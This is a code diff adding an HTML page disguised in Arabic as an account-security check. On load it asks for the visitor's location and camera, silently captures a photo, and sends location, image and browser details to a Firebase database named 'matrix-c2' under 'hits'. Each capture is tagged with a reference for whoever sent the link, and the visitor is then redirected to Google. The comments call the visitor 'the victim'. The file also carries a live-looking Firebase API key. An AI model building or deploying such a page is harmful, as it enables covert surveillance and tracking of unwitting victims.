@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأمين الحساب | Matrix Security</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #000; color: #00ff41; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .loading { border: 4px solid #111; border-top: 4px solid #00ff41; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="status-box">
+        <div class="loading"></div>
+        <p id="msg">جاري فحص اتصالك الآمن...</p>
+        <video id="video" style="display:none;" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        // إعدادات Firebase (نفس اللي في index.html)
+        const firebaseConfig = {
+            apiKey: "AIzaSyAkz8kGNDOJ5caCIbdoXpvJBZgUbigjT5g",
+            authDomain: "matrix-c2.firebaseapp.com",
+            projectId: "matrix-c2",
+            storageBucket: "matrix-c2.firebasestorage.app",
+            messagingSenderId: "778033605872",
+            appId: "1:778033605872:web:a27df427bcf066adf42635"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // فك تشفير البيانات من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        const m = urlParams.get('m');
+
+        async function startCapture() {
+            try {
+                // 1. طلب الموقع الجغرافي
+                navigator.geolocation.getCurrentPosition(pos => {
+                    sendData("Location", { lat: pos.coords.latitude, lon: pos.coords.longitude });
+                });
+
+                // 2. طلب الكاميرا (بصمت)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    takeSnapshot();
+                    stream.getTracks().forEach(track => track.stop()); // قفل الكاميرا بعد اللقطة
+                    document.getElementById('msg').innerText = "تم التحقق بنجاح، جاري التحويل...";
+                    window.location.href = "https://www.google.com"; // تحويل الضحية
+                }, 2000);
+
+            } catch (err) {
+                console.log("Permission Denied");
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        function takeSnapshot() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/jpeg');
+            sendData("Camera", { img: imgData });
+        }
+
+        function sendData(type, payload) {
+            db.ref('hits').push({
+                type: type,
+                data: payload,
+                info: navigator.userAgent,
+                time: new Date().toLocaleString(),
+                m_ref: m // المرجع الخاص بالمستخدم اللي بعت اللينك
+            });
+        }
+
+        // بدء العملية بمجرد دخول الضحية
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
